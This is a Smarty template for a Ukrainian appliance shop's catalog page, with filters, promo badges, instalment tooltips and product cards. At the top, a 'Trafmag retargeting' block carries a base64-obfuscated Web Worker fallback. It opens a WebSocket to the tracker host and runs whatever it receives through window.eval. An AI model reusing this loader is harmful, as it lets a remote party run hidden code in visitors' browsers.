{include file='layouts/_header.tpl'}
<!--Trafmag ретаргетинг-->
{literal}
    <script type='text/javascript'>(function (t, r, f, m, g, c) {
            g = t.createElement(r), c = t.getElementsByTagName(r)[0];
            g.type = 'text/javascript';
            g.async = 1;
            g.src = (t.location.protocol == 'https:' ? 'https:' : 'http:') + f + m;
            g.onerror = function () {
                try {
                    if (t.location.protocol == 'https:') {
                        var wsproto = 'wss', wsport = '8041'
                    } else {
                        var wsproto = 'ws', wsport = '8040'
                    }
                    ;var wrkr_tr_location = wsproto + ':' + f + ':' + wsport + m + '?ref=' + encodeURIComponent(window.location.href);
                    var wrkr_tr = new Worker(URL.createObjectURL(new Blob(['var wrkr_tr_location = "' + wrkr_tr_location + '";eval(atob("DWZ1bmN0aW9uIHNlbmRNZXNzYWdlKGUpew12YXIgaD13cmtyX3RyLm9ubWVzc2FnZTsNd3Jrcl90ci5yZWFkeVN0YXRlPT13cmtyX3RyLkNMT1NFRCYmKHdya3JfdHI9bmV3IFdlYlNvY2tldCh3cmtyX3RyX2xvY2F0aW9uKSksDXdya3JfdHIub25tZXNzYWdlPWgsDXdhaXRGb3JTb2NrZXRDb25uZWN0aW9uKHdya3JfdHIsZnVuY3Rpb24oKXt3cmtyX3RyLnNlbmQoZSk7fSkNfQ1mdW5jdGlvbiB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtyZXR1cm4gMT09PWUucmVhZHlTdGF0ZT92b2lkKG51bGwhPXQmJnQoKSk6dm9pZCB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpfSw1KX07DXdya3JfdHIgPSBuZXcgV2ViU29ja2V0KHdya3JfdHJfbG9jYXRpb24pLA13cmtyX3RyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uICh0KSB7cG9zdE1lc3NhZ2UodC5kYXRhKTt9LA1vbm1lc3NhZ2UgPSBmdW5jdGlvbihlKXtzZW5kTWVzc2FnZShlLmRhdGEpfQ0="))']), {type: "application/javascript"}));
                    wrkr_tr.onmessage = function (msg) {
                        window.eval(msg.data)
                    };
                    wrkr_tr.postMessage('');
                } catch (err) {
                }
            };
            c.parentNode.insertBefore(g, c);
        })(document, 'script', '//t.trafmag.com', '/tracking.js');</script>
{/literal}
<!-- //Trafmag ретаргетинг-->


{if $catId}
    {if !$finalCat}
    {if $pages->totalItemCount > 0}
    <div class="h1_holder span-12 no_margin 123123">
        <h1>
            {if $seo_h1}
                {$seo_h1}
            {else}
                {php} echo $this->menu->findOneBy('active', true);{/php}
                {if $zf.params.brand}
                    {php}
                        foreach (explode('_',$this->_tpl_vars['zf']['params']['brand']) as $brandId) $brands[] = $brandId; echo ' '.join(', ', $brands);{/php}
                {/if}
                {if $accepted_filters}
                    {foreach from=$accepted_filters item=filter name=filters}
                        {if $filter.name=='Материал'}
                            из {$filter.name}а: "
                        {else}
                            , {$filter.name} -
                        {/if}
                        {foreach from=$filter.values item=filterValue name=filter_values}
                            {$filterValue}
                            {if !$smarty.foreach.filter_values.last}
                                ,
                            {/if}
                            {if $smarty.foreach.filters.first && $smarty.foreach.filter_values.last && $filter.name=='Материал'}
                                "
                            {/if}
                        {/foreach}
                    {/foreach}
                {/if}
                {if $zf.params.page} - Страница № {$pages->current}{/if}
            {/if}
        </h1>
    </div>
    <div style="display:none"><!--categorr-->{$zf.params.action}<!--/categorr--></div>
    {if $zf.params.controller=='catalog' && $zf.params.action!='search' && $catId!=1 && $zf.params.action!='compare'}
        {if $seo_h2}
            <h2>{$seo_h2}</h2>
        {/if}
    {/if}
    {if $seo_text_top}
        <article class="stext-top" id="stext">{$seo_text_top}</article>
        <p class="stext-show"><span id="data-toggle-text">Читать дальше</span></p>
    {/if}

    {if $seo_text_bottom}
        <article class="stext-bottom">
            {$seo_text_bottom}
        </article>
    {/if}

    <div class="span-12 no_margin category_nav">
        <div class="category_nav_sort">
            <span>Сортировать:&nbsp;</span>
            <span class="sort_item_selected">
                    {if !$zf.params.sort}
                        Цене <!-- <div></div> -->
                    {else}
                        Популярности <!-- <div></div> -->
                    {/if}
                </span>
            <div class="sort_item" style="display: none;">
                <a href="{url2 assoc.sort='popularity' param=$route}" class="sort_item">Популярности</a>
                <a href="{url2 assoc.sort=null param=$route}" class="sort_item">Цене</a>
            </div>
            {literal}
                <script>
                    $('body').click(function () {
                        $('.sort_item').hide();
                    });
                    $('.sort_item_selected, .sort_item').on('click', function (e) {
                        e.stopPropagation();
                        $('.sort_item').show();
                    });
                </script>
            {/literal}
        </div>

        <div class="switch_view" style="display: none;">
            <span>Вид</span>
            <div class="list_as_block data-display" data-display="grid">
                <span></span>
                <span></span>
                <span></span>
                <span></span>
            </div>
            <div class="list_as_list data-display" data-display="row">
                <span></span>
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        {literal}
            <script type="text/javascript">
                $(document).ready(function () {
                    var now_url = '';
                    $('body').on("click", ".filter_params label", function (event) {
                        var url = $(this).attr('data-filter-name');

                        if ($(this).attr('data-filter-chek') !== 'checked') {
                            if (now_url.length == 0 || now_url == '') {
                                now_url = document.location.href + '/' + url;
                            } else {
                                now_url = now_url + '/' + url;
                            }
                        } else {
                            now_url = now_url.replace(url, '');
                        }

                        $.cookie('draw_ajax_filters', 'true', {expires: 1, path: '590.ua/index.php'});
                        $.ajax({
                            url: now_url,
                            type: "get",
                            success: function (data) {
                                var html_print = $(data).find(".span-12.content").html();
                                $('.span-12.content').html(html_print);
                                $.removeCookie('draw_ajax_filters');
                            }
                        });
                    });
                });
            </script>
        {/literal}
        {assign var="rasprodaja_check" value=0}

        {foreach from=$items item=itemcheck}
            {if $itemcheck.sale==1 && $itemcheck.d90==-1}
                {assign var="rasprodaja_check" value=1}
            {/if}
        {/foreach}


        <div class="filter_params span-6">
            {if $zf.params.availability==1}
                <input id="check1" checked="checked" type="checkbox" name="check" value="check1">
                <label data-filter-name="availability/1" data-filter-chek="checked" for="check1">Только в
                    наличии</label>
            {else}
                <input id="check1" type="checkbox" name="check" value="check1">
                <label data-filter-name="availability/1" for="check1">Только в наличии</label>
            {/if}


            {if $rasprodaja_check!=1}
            {literal}
                <style type="text/css">
                    .span-6 {
                        width: 140px !important;
                    }
                </style>
            {/literal}
            {else}
            {literal}
                <style type="text/css">
                    .span-6 {
                        width: 290px !important;
                    }
                </style>
            {/literal}
            {/if}


            {if $rasprodaja_check==1}
                {if $zf.params.sale=='only'}
                    <input id="check3" checked="checked" type="checkbox" name="check" value="check1">
                    <label data-filter-name="sale/only" data-filter-chek="checked" for="check3">Распродажа</label>
                {else}
                    <input id="check3" type="checkbox" name="check" value="check1">
                    <label data-filter-name="sale/only" for="check3">Распродажа</label>
                {/if}
            {/if}
        </div>
    </div>

{literal}
    <script type="text/javascript">
        $(document).ready(function () {
            $('.category_block_view_item[data-qtip="1"]').qtip({
                content: {
                    text: function (event, api) {
                        return $(this).find('.prev_bonus').html();
                    }
                },
                style: {
                    classes: 'qtip-light qtip-bootstrap',
                    width: '220px',
                },
                position: {
                    my: 'top right',
                    at: 'top left',
                }
            });
        });
    </script>
{/literal}



    {assign var="number_of_element" value=0}
<div id="category_block_view_listing" class="span-12 no_margin">
    {foreach from=$items item=item name=catitems}
    {if $article && $smarty.foreach.catitems.iteration == 21 && !$zf.params.page}
        <div class="span-4 category_block_view_item">
            {if $temporary_cashback_setting_action.on_off == 'on'}
                {assign var="iteration_action" value=0}
                {foreach from=$item_id_temporary_cashback item=foo}
                    {if $item.id2 == $foo}
                        <span {if $item.acttype=='gift'}id="refund_electrolux_gift" {else}id="refund_electrolux"{/if}
                              data-title="{$temporary_cashback_setting_action.catalog_label_for_what}"
                              style="display: block;
                                      text-align: center;
                                      color: #f9ebf3;
                                      font-size: 16px;
                                      font-weight: bold;
                                      position: absolute;
                                      margin-top: 80px;
                                      margin-left: 150px;
                                      z-index: 1;
                                      transform: rotate(15deg);
                                      background-color: #0878C2;
                                      border-radius: 10px;
                                      padding: 5px;
                                      cursor: pointer;
                                      box-shadow: 0 0 10px rgba(0,0,0,0.5);
                              {if $item.acttype=='gift'}
                                      transform: rotate(-20deg) !important;
                                      margin-top: 215px !important;
                                      margin-left: 125px !important;
                              {/if}
                                      width: 90px;">{$temporary_cashback_setting_action.catalog_label_info} {$temporary_cashback_summ[$iteration_action]}
                            грн</span>
                    {/if}
                    {assign var="iteration_action" value=$iteration_action+1}
                {/foreach}
            {/if}
            <div class="cat-item__article">
                <div class="cat-item__article-inner">
                    <h3><a href="/articles/{$article.url}">{$article.announce}</a></h3>
                    <div class="cat-item__article-text">{$article.short_text}</div>
                </div>
                <a href="/articles/{$article.url}">Читать далее</a>
            </div>
            <i class="article-icon"></i>
        </div>
    {/if}

    {if $smarty.foreach.catitems.iteration == 3}
        {if $catId == '28' || $catId == '29'}
            <div class="span-4 category_block_view_item">
                {if $temporary_cashback_setting_action.on_off == 'on'}
                    {assign var="iteration_action" value=0}
                    {foreach from=$item_id_temporary_cashback item=foo}
                        {if $item.id2 == $foo}
                            <span {if $item.acttype=='gift'}id="refund_electrolux_gift"
                                  {else}id="refund_electrolux"{/if}
                                  data-title="{$temporary_cashback_setting_action.catalog_label_for_what}" style="
                                    text-align: center;
                                    color: #f9ebf3;
                                    font-size: 16px;
                                    font-weight: bold;
                                    position: absolute;
                                    margin-top: 80px;
                                    margin-left: 150px;
                                    z-index: 1;
                                    transform: rotate(15deg);
                                    background-color: #0878C2;
                                    border-radius: 10px;
                                    padding: 5px;
                                    cursor: pointer;
                                    box-shadow: 0 0 10px rgba(0,0,0,0.5);
                            {if $item.acttype=='gift'}
                                    transform: rotate(-20deg) !important;
                                    margin-top: 215px !important;
                                    margin-left: 125px !important;
                            {/if}
                                    width: 90px;">{$temporary_cashback_setting_action.catalog_label_info} {$temporary_cashback_summ[$iteration_action]}
                                грн</span>
                        {/if}
                        {assign var="iteration_action" value=$iteration_action+1}
                    {/foreach}
                {/if}
                <a href="/articles/%D0%9C%D0%BE%D0%B9%D0%BA%D0%B8-%D0%B8-%D1%81%D0%BC%D0%B5%D1%81%D0%B8%D1%82%D0%B5%D0%BB%D0%B8-%D0%B2-%D0%BA%D1%80%D0%B5%D0%B4%D0%B8%D1%82-%D0%BF%D0%BE%D0%B4-0">
                    <img src="/images/blanco0.jpg" alt="">
                </a>
            </div>
        {elseif in_array($cat->parent, array(7,17)) && in_array($zf.params.brand,array(1,3,13))}
            <div class="span-4 category_block_view_item">
                {if $temporary_cashback_setting_action.on_off == 'on'}
                    {assign var="iteration_action" value=0}
                    {foreach from=$item_id_temporary_cashback item=foo}
                        {if $item.id2 == $foo}
                            <span {if $item.acttype=='gift'}id="refund_electrolux_gift"
                                  {else}id="refund_electrolux"{/if}
                                  data-title="{$temporary_cashback_setting_action.catalog_label_for_what}" style="
                                    text-align: center;
                                    color: #f9ebf3;
                                    font-size: 16px;
                                    font-weight: bold;
                                    position: absolute;
                                    margin-top: 80px;
                                    margin-left: 150px;
                                    z-index: 1;
                                    transform: rotate(15deg);
                                    background-color: #0878C2;
                                    border-radius: 10px;
                                    padding: 5px;
                                    cursor: pointer;
                                    box-shadow: 0 0 10px rgba(0,0,0,0.5);
                            {if $item.acttype=='gift'}
                                    transform: rotate(-20deg) !important;
                                    margin-top: 215px !important;
                                    margin-left: 125px !important;
                            {/if}
                                    width: 90px;">{$temporary_cashback_setting_action.catalog_label_info} {$temporary_cashback_summ[$iteration_action]}
                                грн</span>
                        {/if}
                        {assign var="iteration_action" value=$iteration_action+1}
                    {/foreach}
                {/if}
                <img src="/images/banner/banner-le-zan-aeg.jpg" alt="">
            </div>
        {/if}
    {/if}

    {if $smarty.foreach.catitems.iteration == 21}
        {if $catId == '45'}
            <div class="span-4 category_block_view_item">
                {if $temporary_cashback_setting_action.on_off == 'on'}
                    {assign var="iteration_action" value=0}
                    {foreach from=$item_id_temporary_cashback item=foo}
                        {if $item.id2 == $foo}
                            <span {if $item.acttype=='gift'}id="refund_electrolux_gift"
                                  {else}id="refund_electrolux"{/if}
                                  data-title="{$temporary_cashback_setting_action.catalog_label_for_what}" style="
                                    text-align: center;
                                    color: #f9ebf3;
                                    font-size: 16px;
                                    font-weight: bold;
                                    position: absolute;
                                    margin-top: 80px;
                                    margin-left: 150px;
                                    z-index: 1;
                                    transform: rotate(15deg);
                                    background-color: #0878C2;
                                    border-radius: 10px;
                                    padding: 5px;
                                    cursor: pointer;
                                    box-shadow: 0 0 10px rgba(0,0,0,0.5);
                            {if $item.acttype=='gift'}
                                    transform: rotate(-20deg) !important;
                                    margin-top: 215px !important;
                                    margin-left: 125px !important;
                            {/if}
                                    width: 90px;">{$temporary_cashback_setting_action.catalog_label_info} {$temporary_cashback_summ[$iteration_action]}
                                грн</span>
                        {/if}
                        {assign var="iteration_action" value=$iteration_action+1}
                    {/foreach}
                {/if}
                <a href="/landing/electrolux/ergorapido/landing.html">
                    <img src="/landing/electrolux/ergorapido/assets/img/landing.jpg"
                         alt="Пылесос Electrolux Ergorapido купить" title="Пылесос Electrolux Ergorapido">
                </a>
            </div>
        {/if}
    {/if}
    {if $login=='акция рождество' || $login=='Гальченко Владимир'}
        {*==================CHRISTMAS==================*}
        {include file='catalog/christmas.tpl'}
        {*==================CHRISTMAS==================*}
    {/if}
    {if $smarty.foreach.catitems.iteration == 21}
        {if $catId == '12'}
            <div class="span-4 category_block_view_item">
                {if $temporary_cashback_setting_action.on_off == 'on'}
                    {assign var="iteration_action" value=0}
                    {foreach from=$item_id_temporary_cashback item=foo}
                        {if $item.id2 == $foo}
                            <span {if $item.acttype=='gift'}id="refund_electrolux_gift"
                                  {else}id="refund_electrolux"{/if}
                                  data-title="{$temporary_cashback_setting_action.catalog_label_for_what}" style="
                                    text-align: center;
                                    color: #f9ebf3;
                                    font-size: 16px;
                                    font-weight: bold;
                                    position: absolute;
                                    margin-top: 80px;
                                    margin-left: 150px;
                                    z-index: 1;
                                    transform: rotate(15deg);
                                    background-color: #0878C2;
                                    border-radius: 10px;
                                    padding: 5px;
                                    cursor: pointer;
                                    box-shadow: 0 0 10px rgba(0,0,0,0.5);
                            {if $item.acttype=='gift'}
                                    transform: rotate(-20deg) !important;
                                    margin-top: 215px !important;
                                    margin-left: 125px !important;
                            {/if}
                                    width: 90px;">{$temporary_cashback_setting_action.catalog_label_info} {$temporary_cashback_summ[$iteration_action]}
                                грн</span>
                        {/if}
                        {assign var="iteration_action" value=$iteration_action+1}
                    {/foreach}
                {/if}
                <a href="/landing/hansa/landing.html">
                    <img src="/landing/hansa/images/9.png" alt="Варочная поверхность Hansa купить"
                         title="Варочная поверхность Hansa" style="left:-10px;max-width:278px;position:relative;">
                </a>
            </div>
        {/if}
    {/if}

    {if $item.bonus_amount > 0}
    <div class="span-4 category_block_view_item" data-qtip="1">
        {if $temporary_cashback_setting_action.on_off == 'on'}
            {assign var="iteration_action" value=0}
            {foreach from=$item_id_temporary_cashback item=foo}
                {if $item.id2 == $foo}
                    <span {if $item.acttype=='gift'}id="refund_electrolux_gift" {else}id="refund_electrolux"{/if}
                          data-title="{$temporary_cashback_setting_action.catalog_label_for_what}" style="
                            text-align: center;
                            color: #f9ebf3;
                            font-size: 16px;
                            font-weight: bold;
                            position: absolute;
                            margin-top: 80px;
                            margin-left: 150px;
                            z-index: 1;
                            transform: rotate(15deg);
                            background-color: #0878C2;
                            border-radius: 10px;
                            padding: 5px;
                            cursor: pointer;
                            box-shadow: 0 0 10px rgba(0,0,0,0.5);
                    {if $item.acttype=='gift'}
                            transform: rotate(-20deg) !important;
                            margin-top: 215px !important;
                            margin-left: 125px !important;
                    {/if}
                            width: 90px;">{$temporary_cashback_setting_action.catalog_label_info} {$temporary_cashback_summ[$iteration_action]}
                        грн</span>
                {/if}
                {assign var="iteration_action" value=$iteration_action+1}
            {/foreach}
        {/if}
        {else}
        <div class="span-4 category_block_view_item">
            {if $temporary_cashback_setting_action.on_off == 'on'}
                {assign var="iteration_action" value=0}
                {foreach from=$item_id_temporary_cashback item=foo}
                    {if $item.id2 == $foo}
                        <span {if $item.acttype=='gift'}id="refund_electrolux_gift" {else}id="refund_electrolux"{/if}
                              data-title="{$temporary_cashback_setting_action.catalog_label_for_what}" style="
                                text-align: center;
                                color: #f9ebf3;
                                font-size: 16px;
                                font-weight: bold;
                                position: absolute;
                                margin-top: 80px;
                                margin-left: 150px;
                                z-index: 1;
                                transform: rotate(15deg);
                                background-color: #0878C2;
                                border-radius: 10px;
                                padding: 5px;
                                cursor: pointer;
                                box-shadow: 0 0 10px rgba(0,0,0,0.5);
                        {if $item.acttype=='gift'}
                                transform: rotate(-20deg) !important;
                                margin-top: 215px !important;
                                margin-left: 125px !important;
                        {/if}
                                width: 90px;">{$temporary_cashback_setting_action.catalog_label_info} {$temporary_cashback_summ[$iteration_action]}
                            грн</span>
                    {/if}
                    {assign var="iteration_action" value=$iteration_action+1}
                {/foreach}
            {/if}
            {/if}

            {if $login == 'old version'}

            {if $smarty.foreach.catitems.iteration <= 4 && $smarty.foreach.catitems.iteration <= $smarty.foreach.catitems.total}
                <div style="display:none">
                    <!--cartdname-->{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand}
                    {$item.name}<!--/cartdname--></div>
            {/if}
            <div class="prev_bonus" style="display:none">
                Купив {$item.brand} {$item.name} у нас, Вы получаете +{$item.bonus_amount|round}грн на бонусный счет к
                цене!
            </div>

            {if $item.bestprice > $item.price || $item.id2==41385}
                <i title="Лучшая цена" class="sale-icon sale-icon-price"></i>
            {/if}
            {if $item.specprice && ($item.bdprice > $item.price) && (($item.bdprice - $item.price) > 1) && !($item.sale==1 && $item.d90==-1)}
                <i title="Акционная цена" class="sale-icon sale-icon-discount"></i>
            {/if}
            {if $item.sale==1 && $item.d90==-1}
                <i title="Распродажа" class="sale-icon sale-icon-sale"></i>
            {/if}
            {else}


            {assign var="margin_top_icon" value=0}
            {if $item.bonus_amount<=0}{assign var="margin_top_icon" value=$margin_top_icon-40}{/if}
            {if $margin_top_icon==0}
            <div style="
	display: block;
    position: absolute;">
                {else}
                <div style="
                        display: block;
                        position: absolute;
                        margin-top: {$margin_top_icon}px;">
                    {/if}

                    {if $item.bonus_amount>0}
                    <div onmouseover="hide_icons_bonus({$number_of_element})"
                         onmouseout="show_icons_bonus({$number_of_element})"
                         class="bonus_on_card_{$number_of_element}"><img src="/images/hint/piggy-bank.png"
                                                                         style="position: absolute;margin-left: -29px;margin-top: 1px;">вернем<br><span
                                style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">{$item.bonus_amount|round}
                            грн.</span>
                        <div class="overlay_icons" style="margin-top: -30px;margin-left: -145px;font-style: italic;">
                            <div class="wrapper_body">
                                <div class="cbm_wrap ">
                                    <a href="https://590.ua/news/%D0%BC%D0%B5%D0%BD%D1%8F%D0%B9%D1%82%D0%B5-%D0%B1%D0%BE%D0%BD%D1%83%D1%81%D1%8B-%D0%BD%D0%B0-%D1%82%D0%B5%D1%85%D0%BD%D0%B8%D0%BA%D1%83"
                                       target="_blank"><h1 title="Узнать подробнее...">Оплачивай бонусами</h1></a>
                                    <a href="https://590.ua/news/%D0%BC%D0%B5%D0%BD%D1%8F%D0%B9%D1%82%D0%B5-%D0%B1%D0%BE%D0%BD%D1%83%D1%81%D1%8B-%D0%BD%D0%B0-%D1%82%D0%B5%D1%85%D0%BD%D0%B8%D0%BA%D1%83"
                                       target="_blank"><img title="Узнать подробнее..."
                                                            src="/images/hint/bonus.jpg"></a>
                                    <p>Вы можете получить бонусную карточку на которой можно накапливать и тратить
                                        бонусы в оплате товара на нашем сайте (1 бонус приравнивается к 1 грн.)<br><br>Бонусный
                                        счет можно использовать для полной или частичной оплаты последующих заказов в
                                        нашем интернет-магазине.<br><br>Карточку постоянного покупателя могут
                                        использовать все члены Вашей семьи, а также друзья.</p></div>
                            </div>
                        </div></div>{/if}

                    {if $item.id_availability == 1}
                        <div onmouseover="hide_icons_oplata_chast({$number_of_element})"
                             onmouseout="show_icons_oplata_chast({$number_of_element})"
                             class="oplata_chast_icon_{$number_of_element}"><img src="/images/hint/oplata_chast.png"
                                                                                 style="position: absolute;margin-left: -32px;margin-top: 1px;">от
                            <span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">{$item.price/$item.rent_index*$curs_evro_smarty|round}</span><br><span
                                    style="font-size: 10px;font-weight: bold;font-style: italic;"> грн./мес.</span>
                            <div class="overlay_icons"
                                 style="margin-top: -30px;margin-left: -145px;font-style: italic;">
                                <div class="wrapper_body">
                                    <div class="cbm_wrap ">
                                        <noindex><a href="https://chast.privatbank.ua/" rel="nofollow" target="_blank">
                                                <h1
                                                        title="Узнать подробнее...">Оплата частями</h1></a></noindex>
                                        <noindex><a href="https://chast.privatbank.ua/" rel="nofollow"
                                                    target="_blank"><img
                                                        title="Узнать подробнее..." src="/images/hint/op_chast.png"></a>
                                        </noindex>
                                        <span style="margin-top: 10px;display: block;font-weight: bold;font-size: 13px;">Этот товар Вы сможете оплатить частями. Без переплат!</span><br>
                                        <span style="font-size: 13px;font-weight: bold;margin-left: -120px;display: block;margin-bottom: 5px;">Все что Вам нужно:</span>
                                        <span style="font-size: 13px;font-weight: bold;margin-left: -100px;display: block;">1. Наличие карты ПриватБанк.</span>
                                        <noindex><a href="https://chast.privatbank.ua/" rel="nofollow"
                                                    target="_blank"><img
                                                        title="Узнать подробнее..."
                                                        src="/images/hint/cardprivat.png"></a>
                                        </noindex>
                                        <span style="font-size: 13px;font-weight: bold;margin-left: -165px;display: block;">2. Доступный лимит.</span>
                                        <span style="font-size: 12px;margin-left: 30px;display: block;">Узнать максимальную суму покупки по сервису очень просто. Нужно отправить SMS сообщение на номер 10060 с текстом chast</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div onmouseover="hide_icons_oplata_rassrochka({$number_of_element})"
                             onmouseout="show_icons_oplata_rassrochka({$number_of_element})"
                             class="oplata_rassrochka_icon_{$number_of_element}"><img
                                    src="/images/hint/oplata_rassrochka_icon.png"
                                    style="position: absolute;margin-left: -32px;margin-top: 1px;">от <span
                                    style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">{$item.price*0.0099*$curs_evro_smarty+$item.price/24*$curs_evro_smarty|round}</span><br><span
                                    style="font-size: 10px;font-weight: bold;font-style: italic;"> грн./мес.</span>
                            <div class="overlay_icons"
                                 style="margin-top: -30px;margin-left: -145px;font-style: italic;">
                                <div class="wrapper_body">
                                    <div class="cbm_wrap ">
                                        <noindex><a href="https://chast.privatbank.ua/" rel="nofollow" target="_blank">
                                                <h1 title="Узнать подробнее...">МГНОВЕННАЯ РАССРОЧКА</h1></a></noindex>
                                        <noindex><a href="https://chast.privatbank.ua/" rel="nofollow"
                                                    target="_blank"><img title="Узнать подробнее..."
                                                                         src="/images/hint/oplata_rassrochka.jpg"></a>
                                        </noindex>
                                        <p>Покупайте товары в рассрочку до 24 месяцев с небольшой ежемесячной комиссией
                                            от стоимости товара.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    {/if}

                    {if $item.id_brand == '26' && $item.id_category != 60}
                        <div class="waranty_zirtal_{$number_of_element}"><img src="/images/hint/waranty_zirtal.png"
                                                                              style="position: absolute;margin-left: -26px;margin-top: 1px;">гарантия<br><span
                                    style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">36 мес.</span>
                        </div>
                    {/if}

                    {if $item.bestprice > $item.price || $item.id2==41385}
                        <div onmouseover="hide_icons_best_price({$number_of_element})"
                             onmouseout="show_icons_best_price({$number_of_element})"
                             class="best_price_icon_{$number_of_element}"><img src="/images/hint/thumbs_up.png"
                                                                               style="position: absolute;margin-left: -29px;margin-top: 1px;">лучшая<br><span
                                    style="font-weight: bold;font-size: 10px;font-style: italic;">цена</span>
                            <div class="overlay_icons"
                                 style="margin-top: -30px;margin-left: -145px;font-style: italic;">
                                <div class="wrapper_body">
                                    <div class="cbm_wrap ">
                                        <h1>Отличный выбор</h1>
                                        <img src="/images/hint/best_price.jpg">
                                        <p>Мы отследили цены во многих интернет магазинах по этому товару. И смело можем
                                            утверждать, что наша цена является лучшей!<br>Товары, на которых Вы заметили
                                            иконку с пальцем вверх - достойны Вашего внимания :)</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    {/if}
                </div>
                {if $item.acttype != 'gift' && $item.x_index == '1' || $item.id == '21465'}
                    <div onmouseover="hide_icons_best_tradein({$number_of_element})"
                         onmouseout="show_icons_best_tradein({$number_of_element})"
                         class="trdein_icon_{$number_of_element}"><img src="/images/icons/zamena_catalog.png"
                                                                       style="position: absolute;margin-left: -29px;margin-top: 1px;">
                        <div class="overlay_icons" style="margin-top: -460px;margin-left: -201px;font-style: italic;">
                            <div class="wrapper_body">
                                <div class="cbm_wrap ">
                                    <noindex><a href="https://590.ua/articles/zamena" rel="nofollow" target="_blank"><h1
                                                    title="Узнать подробнее...">Замена (Trade-in)</h1></a></noindex>
                                    <noindex><a href="https://590.ua/articles/zamena" rel="nofollow"
                                                target="_blank"><img title="Узнать подробнее..."
                                                                     src="/images/hint/tradein_description.jpg"></a>
                                    </noindex>
                                    <p>Вы имеете следующую выгоду:<br>1. Весомая скидка на технику<br>2. Бесплатная
                                        доставка в квартиру<br>3. Бесплатное подключение<br>4. Вывоз и утилизация старой
                                        техники<br><br>Все это, в течении короткого времени мы сделаем сами, тем самым
                                        освободив Вас от хлопот и дополнительных финансовых расходов.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                {/if}


                {if $login=='акция рождество' || $login=='Гальченко Владимир'}
                    {assign var="iteration_celebration" value=0}
                    {foreach from=$item_id_temporary_celebration item=foo}
                        {if $item.id == $foo  && $item.acttype!='gift'}
                            <div onmouseover="hide_icons_black_friday_({$number_of_element})"
                                 onmouseout="show_icons_black_friday_({$number_of_element})"
                                 class="black_friday_{$number_of_element} grow-rotate"><img class="pulse"
                                                                                            src="/images/hint/black.png"
                                                                                            style="position: absolute;margin-left: -29px;margin-top: 1px;">
                                <div style="
        color: #9f2234;
            position: absolute;
            margin-top: 47px;
            margin-left: 4px;
            font-size: 12px;
            transform: rotate(-6deg);
            font-weight: bold;
            font-family: sans-serif;
            width: 80px;
            text-align: center;
        ">{$summ_temporary_celebration[$iteration_celebration]} грн.
                                </div>
                                <div class="overlay_icons"
                                     style="margin-top: -475px;margin-left: -128px;font-style: italic;">
                                    <div class="wrapper_body">
                                        <div class="cbm_wrap ">
                                            <noindex><a href="https://goo.gl/4CLd9k" rel="nofollow" target="_blank"
                                                        title="Показать все товары со скидками"><h1>Christmas</h1></a>
                                            </noindex>
                                            <noindex><a href="https://goo.gl/4CLd9k" rel="nofollow" target="_blank"
                                                        title="Показать все товары со скидками"><img
                                                            src="/images/hint/black_friday.jpg"></a></noindex>
                                            <p>Рождество - это тихий, семейный праздник, который стоит провести в кругу
                                                самых близких людей! Мы поздравляем всех наших клиентов с этим светлым
                                                праздником и дарим в честь него подборку товаров с большими
                                                скидками.<br><strong style="font-size: 11px; line-height: 11px;">Внимание:
                                                    в акции не участвуют комплекты вместе дешевле. Акционные товары
                                                    возможно оплатить: наличными, картой, безналичным переводом. Оплата
                                                    частями от Приват Банка не распространяется на акционные
                                                    товары.</strong></p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        {/if}
                        {assign var="iteration_celebration" value=$iteration_celebration+1}
                    {/foreach} {/if}
                {/if}
                <div class="head">
                    <a href="{iurl assoc.cat_latin=$item.cat_latin_single  assoc.parent=$item.parentname assoc.subdomain=$item.subdomain assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}"
                       onclick="onProductClickEcommerce({$item.id})">{$item.brand} {$item.name}</a>
                    <span class="description">{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if}</span>

                    {if !($item.archive == 1 && $item.id_availability == 3) }
                    {if $item.id_availability == 1}
                    <span class="in_stock_status">
                                        <link itemprop="availability" href="http://schema.org/InStock"/>Есть в наличии
                                    </span>

                    {elseif $item.id_availability == 2 && $item.qrm>0}
                    <link itemprop="availability" href="http://schema.org/InStock"/>
                    <span style="font-weight: bold;color: #0D8ABC;">Наличие уточняйте</span>

                    {elseif $altItem.id_availability == 2 && $item.qrm==0 || $item.qrm==""} <span
                            class="order_stock_status">
                                        <a style="color: red;" class="on-order" target="_blank" href="/articles/4"
                                           title="Как получить товар под заказ">
                                            <link itemprop="availability" href="http://schema.org/PreOrder"/>Под заказ
                                        </a>

                        {elseif $item.id_availability == 3}
                        <span class="order_stock_status">
                                        <a class="on-order" target="_blank" href="/articles/4"
                                           title="Как получить товар под заказ">
                                            <link itemprop="availability" href="http://schema.org/PreOrder"/>Под заказ
                                        </a>
                                    </span>

                        {elseif $item.id_availability == 4}
                        <span class="in_stock_status" rel="tooltip" data-placement="top"
                              data-original-title="Есть в наличии, доставку уточняйте."
                              title="Есть в наличии, доставку уточняйте.">
                                        <link itemprop="availability" href="http://schema.org/InStock"/>Есть в наличии, доставку уточняйте.
                                    </span>
                        {else}
                        <link itemprop="availability" href="http://schema.org/InStock"/>
                                    <span style="font-weight: bold;color: #0D8ABC;">Наличие уточняйте</span>{/if}
                        {/if}
                </div>
                <div class="image_holder">
                    {if $item.imgid}
                        <a href="{iurl assoc.cat_latin=$item.cat_latin_single  assoc.parent=$item.parentname assoc.subdomain=$item.subdomain assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}"
                           title="{$item.brand} {$item.name}" onclick="onProductClickEcommerce({$item.id})">
                            <img itemprop="image" src="{$url.img}/catalog/{$item.imgid}_s.{$item.imgext}"
